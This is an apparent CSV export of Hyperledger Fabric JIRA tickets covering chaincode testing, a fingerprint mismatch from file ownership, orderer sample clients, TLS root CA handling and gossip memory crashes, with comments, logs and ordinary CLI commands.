golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/barebones/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/net-0.7.0,dependabot/go_modules/regression/smoke/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/basicnetwork/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/barebones/golang.org/x/text-0.3.8,revert-342-mergify/bp/main/pr-340,dependabot/go_modules/regression/smoke/k8s.io/client-go-0.20.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/publish/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/regression/basicnetwork/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/text-0.3.8,dependabot/go_modules/tools/operator/golang.org/x/net-0.7.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/text-0.3.8,dependabot/go_modules/regression/smoke/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/barebones/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/barebones/golang.org/x/crypto-0.1.0,dependabot/go_modules/tools/operator/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/barebones/k8s.io/client-go-0.20.0,dependabot/go_modules/tools/operator/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/chaincodes/marbles02_private/go/golang.org/x/net-0.7.0,,,,,,true,"22/Aug/17 11:26 PM;AdnanChoudhury;https://gerrit.hyperledger.org/r/#/c/12583/;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
shim.MockStub still has Read-your-writes behaviour included,FAB-5832,20262,,Story,Closed,FAB,Fabric,software,denyeart,,,Low,Won't Do,,philT,philT,18/Aug/17 6:44 AM,23/Jan/20 7:02 AM,28/Oct/23 3:00 AM,23/Jan/20 7:02 AM,,,,Future,,fabric-ledger,,,,,,0,chaincode,Ledger,quality,stale-item,test,v1.0,"Currently Fabric does not support Read-your-writes(RYW) semantics. Its was removed with change in ticket -FAB-1187-.

The MockStub has not been adapted to this behaviour. We repeatedly have encountered issues, where the tests behaved differently then the actual application.",Fabric v1.0 running from the latest baseimage. Go 1.8,denyeart,philT,Senthil1,sykesm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-5333,,,,,,,,,FAB-5833,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Unset,,,,,,,,,,,,"1|hzydkn:",,,,Unset,,,,,,,,Unset,,,,,,,,,,,denyeart,philT,Senthil1,sykesm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"24/Aug/17 10:45 PM;denyeart;[~Senthil1] Could you take a look at this one?;;;","04/Sep/17 4:10 PM;Senthil1;For v1.0, we haven't updated MockStub implementation yet. MockStub implementation does not provide support for simulation of transaction, validation, and commit. Hence, every PutState() modifies the ledger.  We need a new testing architecture which can directly use ledger interface. For now, it is better to dev mode for testing purpose. [http://hyperledger-fabric.readthedocs.io/en/latest/peer-chaincode-devmode.html];;;","23/Jan/20 7:02 AM;sykesm;Stale;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Enable Read-your-writes(RYW) optionally for getState,FAB-5833,20263,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Won't Do,,philT,philT,18/Aug/17 6:56 AM,23/Jan/20 7:02 AM,28/Oct/23 3:00 AM,23/Jan/20 7:02 AM,Future,,,Future,,fabric-ledger,,,,,,0,chaincode,Ledger,shim,stale-item,,,"As a chaincode developer I want to be able to enable RYW during key retrieval optionally, so that I can access already updated keys during my transaction.

 

My suggestion would be to enable this via an extension of the API in the fashion of as `stub.GetTrxState(key string)`.

Having this feature would make chaincode development more appealing and explicitly enable access to data already written during the currently active transaction.",,philT,sykesm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-1187,FAB-5832,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Unset,,,,,,,,,,,,"1|hzydkv:",,,,Unset,,,,,,,,Unset,,,,,,,,,,,philT,sykesm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"23/Jan/20 7:02 AM;sykesm;Stale;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"Ownership difference  makes chaincode instantiate failure due to ""chaincode fingerprint mismatch data mismatch""",FAB-5835,20265,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,muralisr,barry_liang,barry_liang,18/Aug/17 1:07 PM,20/Jul/18 11:14 PM,28/Oct/23 3:00 AM,18/Feb/18 10:48 PM,v1.0.0,,,v1.1.0,,fabric-peer,,,,,,0,install,,,,,,"In fabric 1.0.  Install chaincode by cli (fabric-tools),  peer will package the chaincode to codepackage ,  include the file name, path , mode, change time, owner(also id), ownergroup(aslo id) .   if we start two cli container in different VM  and mount the chaincode with different owner.  when we install the same chaincode , the two cli container will get different codePackage.   and peer will startup fail.  give error like this:

{color:#ff0000}Error executing chaincode: Could not get deployment transaction from LSCC for mycc:1.0 - Get ChaincodeDeploymentSpec for mycc/bancassurance from LSCC error: chaincode fingerprint mismatch data mismatch{color}

 

repeated step:

1,start a blockchain network with 2 peer (peer1  peer2). (i test in docker swarm , create service, i think docker compose will be the same)

2,start two cli container in different VM,  and mount chaincode to cli container.

(for example :--mount type=bind,source=/app/hyperledger/chaincodes/src/chaincode,destination=/opt/gopath/src/chaincode \)

make sure, in the two VM,  example chaincode is the same .  and   chaincode 's owner is different. (change by chown )

3. enter one cli container ,and createchannel ,and join 2 peers to the channel.

4,enter cli 1  ,and install the example chaincode to peer1.

5,enter cli 2, install the example chaincode to peer2

6, enter cli 1, init the chaincode in peer1.  it works ,  peer1 can start chaincode container ,and can invoke, query.

7, enter cli 2,  query the chaincode in peer2.  peer2 start chaincode container failed.  and give the error message:

Error executing chaincode: Could not get deployment transaction from LSCC for mycc:1.0 - Get ChaincodeDeploymentSpec for mycc/bancassurance from LSCC error: chaincode fingerprint mismatch data mismatch

 ",,baohua,barry_liang,denyeart,muralisr,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzydlb:",,,,,,,,,,,,,,,,,,,,,,,baohua,barry_liang,denyeart,muralisr,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"21/Aug/17 12:27 PM;baohua;Would be helpful to help attach the compose files needed.

Thanks!;;;","08/Sep/17 4:14 AM;muralisr;[~barry_liang] there's a ""peer chaincode package"" command to precompute the chaincode package once which can later be used to install on all peers consistently using the ""peer chaincode install <package.file>"". Can you try that method and update please ?;;;","11/Sep/17 1:02 PM;barry_liang;1,peer chaincode package -n mycc -v 1.0.0 -s package.file -p chaincode/go/chaincode_example02/

2, peer chaincode install package.file

 

get error :

Error: Error endorsing chaincode: rpc error: code = Unknown desc = proto: bad wiretype for field peer.ChaincodeSpec.Type: got wiretype 2, want 0;;;","12/Sep/17 10:25 PM;muralisr;[~barry_liang] this is fixed in https://gerrit.hyperledger.org/r/#/c/12727/  and should be available in 1.0.2 (or latest).;;;","19/Sep/17 6:07 PM;barry_liang;[~muralisr] thanks for your  info，，   i sure  peer chaincode package will be ok in new version.

but if two orgs setup a blockchain network ,  maybe they want to install the chaincode from src(the go chaincode).

so  i think it will be better if solve the bug 

 ;;;","19/Sep/17 8:50 PM;muralisr;[~barry_liang] agreed. Suggestion above was just a work around and this JIRA is in my queue.;;;","28/Jan/18 9:52 AM;muralisr;[~barry_liang] this is likely fixed by FAB-7434 . Can you check please ?;;;","15/Feb/18 2:26 AM;denyeart;[~muralisr] Since 1.1 is closing down and we have not heard back from reporter, could you give it a try and confirm this is fixed now?;;;","18/Feb/18 9:19 AM;muralisr;[~denyeart] [~barry_liang] this appears to be fixed in latest master.

Change e2e_cli/scripts/script.sh as follows

{code:java}
...

#list the sample to show owner/group
ls -ltr /opt/gopath/src/github.com/hyperledger/fabric/examples/chaincode/go/chaincode_example02

## Install chaincode on Peer0/Org1 and Peer2/Org2
echo ""Installing chaincode on org1/peer0...""
installChaincode 0
echo ""Sleeping..change owner of the examples folder and contemts""
sleep 120
echo ""Awake...""

#list the sample to show new owner/group
ls -ltr /opt/gopath/src/github.com/hyperledger/fabric/examples/chaincode/go/chaincode_example02

echo ""Install chaincode on org2/peer2...""
installChaincode 2

#Instantiate chaincode on Peer0/Org1
echo ""Instantiating chaincode on org1/peer0...""
instantiateChaincode 0
{code}

execute e2e_cli. When the script sleeps before installing the CC on second peer, login to CLI container and do

{code:java}
useradd someuser
groupadd somegroup
cd ..
chown -R someuser.somegroup examples/
 ls -ltr examples/chaincode/go/chaincode_example02
total 12
-rw-r--r-- 1 someuser somegroup 3165 Jan 28 00:31 chaincode_example02_test.go
-rw-r--r-- 1 someuser somegroup 5078 Jan 28 00:31 chaincode_example02.go
{code}

The script wakes up and runs to completion successfully.

The logs indicate user change on the chaincode before the new install
{code:java}
...
...
total 12
-rw-r--r-- 1 root root 3165 Jan 28 00:31 chaincode_example02_test.go
-rw-r--r-- 1 root root 5078 Jan 28 00:31 chaincode_example02.go
Installing chaincode on org1/peer0...
...
...
===================== Chaincode is installed on remote peer PEER0 =====================

Sleeping..change owner of the examples folder and contemts
Awake...
total 12
-rw-r--r-- 1 someuser somegroup 3165 Jan 28 00:31 chaincode_example02_test.go
-rw-r--r-- 1 someuser somegroup 5078 Jan 28 00:31 chaincode_example02.go
Install chaincode on org2/peer0...
...
...

{code}
;;;","18/Feb/18 10:48 PM;denyeart;[~muralisr] Thank you for testing!  Marking Done.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Fix broken orderer sample clients,FAB-5836,20276,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,jyellick,jyellick,jyellick,18/Aug/17 10:06 PM,20/Jul/18 11:14 PM,28/Oct/23 3:00 AM,25/Aug/17 12:00 AM,,,,v1.1.0,,fabric-orderer,,,,,,0,,,,,,,"The sample clients for the orderer have fallen into a mild state of disrepair.

{{single_tx_client}} has not worked in a long time, and {{broadcast_msg}} has a bad sleep that crept in, and {{deliver_stdout}} does not support signing messages.

This bug is to fix these problems.",,jyellick,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzydlj:",,,,,,,,,,,,,,,,,,,,,,,jyellick,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
align maintainers section with charter,FAB-5840,20287,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,ChristopherFerris,ChristopherFerris,ChristopherFerris,19/Aug/17 12:31 AM,21/Jul/18 3:48 AM,28/Oct/23 3:00 AM,19/Aug/17 8:18 PM,v1.0.0,v1.0.1,,,,fabric-docs,,,,,,0,,,,,,,"The charter reads: ""A Contributor may become a Maintainer by a majority approval of the existing Maintainers."" so the maintainers section should be aligned.",,ChristopherFerris,mastersingh24,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Unset,,,,,,,,,,,,"1|hzydm7:",,,,Unset,,,,,,,,Unset,,,,,,,,,,,ChristopherFerris,mastersingh24,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"19/Aug/17 8:18 PM;mastersingh24;https://gerrit.hyperledger.org/r/#/c/12601/;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
System Chaincode queries,FAB-5841,20290,19362,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,RichardHill,latitiah,latitiah,19/Aug/17 1:22 AM,20/Jul/18 11:14 PM,28/Oct/23 3:00 AM,18/Apr/18 2:51 AM,,,,,,,,,,,,0,,,,,,,"We should be able to query the system in order to get certain basic information such as the list of channels, chain height, etc.",,latitiah,scottz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzydmf:",,,,,,Sprint 19 - Quality,,,,,,,,,,,,,,,,,latitiah,scottz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,dependabot/go_modules/regression/publish/golang.org/x/sys-0.1.0,dependabot/go_modules/tools/operator/k8s.io/client-go-0.20.0,dependabot/go_modules/chaincodes/marbles02_private/go/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/smoke/golang.org/x/net-0.7.0,dependabot/go_modules/tools/chaincode-integration/resources/chaincode/simple-go/golang.org/x/net-0.7.0,dependabot/go_modules/regression/barebones/golang.org/x/net-0.7.0,dependabot/go_modules/tools/gotools/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/smoke/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/smoke/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/publish/golang.org/x/text-0.3.8,dependabot/go_modules/regression/publish/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/smoke/golang.org/x/text-0.3.8,release-2.5,dependabot/go_modules/regression/barebones/github.com/opencontainers/runc-1.1.5,release-2.4,lindluni-patch-1,dependabot/go_modules/regression/publish/k8s.io/client-go-0.20.0,dependabot/go_modules/regression/basicnetwork/k8s.io/client-go-0.20.0,dependabot/go_modules/tools/chaincode-integration/resources/chaincode/simple-go/golang.org/x/text-0.3.8,dependabot/go_modules/regression/basicnetwork/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/publish/golang.org/x/net-0.7.0,dependabot/go_modules/regression/publish/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/net-0.7.0,dependabot/go_modules/regression/barebones/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/smoke/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/basicnetwork/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/barebones/golang.org/x/text-0.3.8,revert-342-mergify/bp/main/pr-340,dependabot/go_modules/regression/publish/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/regression/smoke/k8s.io/client-go-0.20.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/sys-0.1.0,dependabot/go_modules/tools/operator/golang.org/x/net-0.7.0,dependabot/go_modules/tools/operator/golang.org/x/text-0.3.8,dependabot/go_modules/regression/basicnetwork/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/regression/smoke/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/text-0.3.8,dependabot/go_modules/regression/barebones/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/barebones/golang.org/x/sys-0.1.0,dependabot/go_modules/tools/operator/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/barebones/k8s.io/client-go-0.20.0,dependabot/go_modules/chaincodes/marbles02_private/go/golang.org/x/net-0.7.0,dependabot/go_modules/tools/operator/github.com/docker/docker-20.10.24incompatible,,,,,,true,"19/Aug/17 1:23 AM;latitiah;See the following for the current list of system APIs:
  https://github.com/hyperledger/fabric/blob/master/core/scc/qscc/query.go#L47-L52

Example calling using CLI:
{code:None}
peer chaincode query -C mychannel -n qscc -c '{""Args"":[""GetBlockByNumber"",""mychannel"", ""1""]}'`
{code};;;","14/Oct/17 3:38 AM;scottz;https://jira.hyperledger.org/browse/FAB-2985 ""Utilize error handling framework throughout Fabric"" is a serviceability feature in v1.1 to provide more info we might like to see. For example, for more specifics, this subtask might be helpful: https://jira.hyperledger.org/browse/FAB-6114

 ;;;","02/Feb/18 12:20 AM;latitiah;https://gerrit.hyperledger.org/r/17413;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Implement Serviceability / Integrate Error Handling on MSP,FAB-5842,20291,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,ales,elli-androulaki,elli-androulaki,19/Aug/17 1:35 AM,21/Jul/18 3:50 AM,28/Oct/23 3:00 AM,12/Oct/17 10:55 PM,,,,v1.1.0,,fabric-crypto,,,,,,0,Release-planning-1.1,,,,,,,,elli-androulaki,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,57600,57600,,0%,57600,57600,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-2985,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Unset,,,,,,,,,,,,"1|hzydmn:",,,,Unset,,,,,,,,Unset,,,,,,,,,,,elli-androulaki,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"01/Sep/17 8:32 PM;elli-androulaki;Related CR:
[https://gerrit.hyperledger.org/r/#/c/12925/]

 ;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Document potential solutions to deciding on identity expiration at commitment time,FAB-5843,20292,,Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Won't Do,elli-androulaki,elli-androulaki,elli-androulaki,19/Aug/17 2:25 AM,23/Jan/20 7:03 AM,28/Oct/23 3:00 AM,23/Jan/20 7:03 AM,,,,Future,,fabric-crypto,,,,,22/Aug/17 12:00 AM,0,Documentation,Security,stale-item,,,,"Potential solutions on supporting identity expiration and shortcomings are described here:

https://docs.google.com/document/d/1nevpNkdGTRne2rLyrnVlwY9_keLnL5DTmE_tZb5QgoM/edit?usp=sharing",,elli-androulaki,sykesm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,28800,28800,,0%,28800,28800,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-3678,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzydmv:",,,,,,,,,,,,,,,,,,,,,,,elli-androulaki,sykesm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"14/Mar/18 8:34 PM;elli-androulaki;This one is  a long standing item. Documentation of its has been completed, but no actual decision yet. So i will move this to 1.3, to remind ourselves to make decision.;;;","23/Jan/20 7:03 AM;sykesm;Stale;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
CI Failure in Chaincode Tests,FAB-5844,20293,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,muralisr,jyellick,jyellick,19/Aug/17 3:13 AM,20/Jul/18 11:14 PM,28/Oct/23 3:00 AM,08/Sep/17 4:15 AM,,,,,,fabric-peer,,,,,,0,,,,,,,"From https://jenkins.hyperledger.org/job/fabric-verify-x86_64/15831/console

{noformat}
16:04:08 unit-tests_1  | 2017-08-18 16:04:06.716 UTC [shim] SetupChaincodeLogging -> INFO 04e Chaincode log level not provided; defaulting to: INFO
16:04:08 unit-tests_1  | 2017-08-18 16:04:06.716 UTC [shim] SetupChaincodeLogging -> INFO 04f Chaincode (build level: ) starting up ...
16:04:08 unit-tests_1  | 2017-08-18 16:04:06.716 UTC [shim] SetupChaincodeLogging -> WARN 050 Error: logger: invalid log level for shim log level: war
16:04:08 unit-tests_1  | 2017-08-18 16:04:06.716 UTC [shim] SetupChaincodeLogging -> INFO 051 Chaincode (build level: ) starting up ...
16:04:08 unit-tests_1  | 2017-08-18 16:04:06.716 UTC [shim] SetupChaincodeLogging -> WARN 052 Error: 'logger: invalid log level' for chaincode log level: deb; defaulting to INFO
16:04:08 unit-tests_1  | 2017-08-18 16:04:06.717 UTC [shim] SetupChaincodeLogging -> INFO 053 Chaincode log level not provided; defaulting to: INFO
16:04:08 unit-tests_1  | 2017-08-18 16:04:06.717 UTC [shim] SetupChaincodeLogging -> INFO 054 Chaincode log level not provided; defaulting to: INFO
16:04:08 unit-tests_1  | panic: send on closed channel
16:04:08 unit-tests_1  | 
16:04:08 unit-tests_1  | goroutine 41 [running]:
16:04:08 unit-tests_1  | panic(0x95c7e0, 0xc4202a5c50)
16:04:08 unit-tests_1  | 	/opt/go/src/runtime/panic.go:500 +0x1a1
16:04:08 unit-tests_1  | github.com/hyperledger/fabric/core/chaincode/shim.(*inProcStream).Send(0xc4202ac830, 0xc4201a11d0, 0xc420288b78, 0xc4201a1101)
16:04:08 unit-tests_1  | 	github.com/hyperledger/fabric/core/chaincode/shim/_test/_obj_test/inprocstream.go:20 +0x59
16:04:08 unit-tests_1  | github.com/hyperledger/fabric/core/chaincode/shim.(*Handler).serialSend(0xc420288b60, 0xc4201a11d0, 0x0, 0x0)
16:04:08 unit-tests_1  | 	github.com/hyperledger/fabric/core/chaincode/shim/_test/_obj_test/handler.go:61 +0x9d
16:04:08 unit-tests_1  | github.com/hyperledger/fabric/core/chaincode/shim.(*Handler).serialSendAsync.func1(0xc420288b60, 0xc4201a11d0, 0x0)
16:04:08 unit-tests_1  | 	github.com/hyperledger/fabric/core/chaincode/shim/_test/_obj_test/handler.go:75 +0x43
16:04:08 unit-tests_1  | created by github.com/hyperledger/fabric/core/chaincode/shim.(*Handler).serialSendAsync
16:04:08 unit-tests_1  | 	github.com/hyperledger/fabric/core/chaincode/shim/_test/_obj_test/handler.go:80 +0x5d
16:04:08 unit-tests_1  | FAIL	github.com/hyperledger/fabric/core/chaincode/shim	2.048s
16:04:08 unit-tests_1  | error: exit status 1
16:04:08 unit-tests_1  | panic: EOF
16:04:08 unit-tests_1  | 
16:04:08 unit-tests_1  | goroutine 1 [running]:
16:04:08 unit-tests_1  | panic(0x4daca0, 0xc42000a0f0)
16:04:08 unit-tests_1  | 	/opt/go/src/runtime/panic.go:500 +0x1a1
16:04:08 unit-tests_1  | main.main()
16:04:08 unit-tests_1  | 	/opt/gotools/obj/gopath/src/github.com/AlekSi/gocov-xml/gocov-xml.go:60 +0x15fd
16:04:10 unittest_unit-tests_1 exited with code 2
16:04:10 Stopping couchdb ... 
16:04:10 Stopping unittest_vp_1 ... 
16:04:10 
Stopping unittest_vp_1 ... done
{noformat}

",,jyellick,muralisr,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzydn3:",,,,,,,,,,,,,,,,,,,,,,,jyellick,muralisr,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"19/Aug/17 3:15 AM;muralisr;this is related to https://jira.hyperledger.org/browse/FAB-1632. The fabric side of the send was fixed in [https://gerrit.hyperledger.org/r/#/c/12393/.] Need to fix the shim side.;;;","08/Sep/17 4:15 AM;muralisr;fixed in https://gerrit.hyperledger.org/r/#/c/12603/;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Trusted roots population should not assume separation between orderer orgs and application orgs,FAB-5845,20294,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,yacovm,yacovm,yacovm,19/Aug/17 5:25 AM,20/Jul/18 11:14 PM,28/Oct/23 3:00 AM,20/Aug/17 6:12 AM,v1.0.1,,,v1.0.2,v1.1.0,fabric-peer,,,,,,0,,,,,,,"The code in *core/peer/peer.go* has the following logic:

{code}
				for _, root := range v.GetTLSRootCerts() {
					// check to see of this is an app org MSP
					if _, ok := appOrgMSPs[k]; ok {
						peerLogger.Debugf(""adding app root CAs for MSP [%s]"", k)
						appRootCAs = append(appRootCAs, root)
					} else {
						peerLogger.Debugf(""adding orderer root CAs for MSP [%s]"", k)
						ordererRootCAs = append(ordererRootCAs, root)
					}
				}
{code}

This assumes that the application orgs and the orderer orgs are separate, but a peer and an orderer may be in the same org and then this code might not (for example) populate the orderer TLS root CA certs. 

The implication, is that a peer might not be able to connect to an orderer.
I think this is the case with the [following |https://stackoverflow.com/questions/45736954/setting-up-tls-communication-between-orderers-and-peers]stackoverflow issue.

[~jyellick] [~mastersingh24]",,jyellick,mastersingh24,scottz,yacovm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzydnb:",,,,,,,,,,,,,,,,,,,,,,,jyellick,mastersingh24,scottz,yacovm,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,release-1.0,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"19/Aug/17 5:39 AM;yacovm;https://gerrit.hyperledger.org/r/#/c/12607/;;;","20/Aug/17 6:11 AM;mastersingh24;Yes - good find.  At the time the code was written, there was no way to actually get the ordererconfig from the cm;;;","06/Sep/17 8:08 AM;scottz;There were no UT tests added with this fix. I am surprised this was merged into release v1.0.2 without any documented test coverage.

[~yacovm] - Could you describe for our customers the tests you performed after fixing this issue? (And, if there is any additional testing our team can do to ensure completeness of testing, let us know.);;;","06/Sep/17 5:37 PM;yacovm;This can be tested by co-locating the orderer and peer x509 material in the same organization and creating a single organization in the consortium and in the channel and then doing the standard flow (create channel, join peers, invoke, query, etc. etc.) while TLS is enabled.;;;","06/Sep/17 5:39 PM;yacovm;If you want to test it - my recommendation is simply using cryptogen and having 2 CA trees (orderer org tree and peer org tree) in the same organization - this would allow the peers and the orderers identify each other under the same org although having different root CAs. 

(It worked when I tried...) ;;;","07/Sep/17 4:43 AM;scottz;Excellent. Thanks!;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Identity pull digests are logged in gibberish,FAB-5848,20299,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,yacovm,yacovm,yacovm,19/Aug/17 8:33 PM,20/Jul/18 11:14 PM,28/Oct/23 3:00 AM,22/Aug/17 7:49 PM,v1.0.1,,,v1.1.0,,fabric-gossip,,,,,,0,,,,,,,"In gossip, when logs are in DEBUG level - the pull digest message is logged.
Identities are replicated via pull (as well) and the digest that is printed is printed in gibberish, since the digest is hash(identity bytes).

We can't make the computation of the digest be different since that would remove compatibility with v1.0.x, but we can at least make the digests of identities be printed not in gibberish.",,yacovm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzydof:",,,,,,,,,,,,,,,,,,,,,,,yacovm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"coming late to the party, lagging peer crashes due to exhaustion",FAB-5849,20300,,Bug,Closed,FAB,Fabric,software,denyeart,,,High,Done,yacovm,scottz,scottz,20/Aug/17 12:00 AM,20/Jul/18 11:14 PM,28/Oct/23 3:00 AM,24/Sep/17 11:01 PM,v1.0.1,,,v1.0.3,v1.1.0,fabric-gossip,fabric-peer,,,,,0,,,,,,,"+Summary+:  A lagging nonleader peer has memory exhaustion and crashes while trying to catch up. A new gossip-non-leader peer resets 6-10 mins after joining a network channel when existing peers ledger exceeds 20000 blocks. It recovers close to 2000 blocks and then crashes. Also, but rarely, a peer that joins and becomes a gossip-orgleader crashes (say 1 out of 10 times). This happens on v1.0.1, with and without the solution FAB-5793.

+Scenario+
 # Establish a network using docker swarm with multihost configuration. Refer to attached configuration files. Create one channel which has processed and written more than 10000 transactions to the ledger. For all peers, set CORE_PEER_GOSSIP_USELEADERELECTION=false. With two peers in one org, set one peer as leader (CORE_PEER_GOSSIP_ORGLEADER=true) and set the other one as nonleader (CORE_PEER_GOSSIP_ORGLEADER=false).
 # Join a third peer, set as nonleader (CORE_PEER_GOSSIP_ORGLEADER=false).
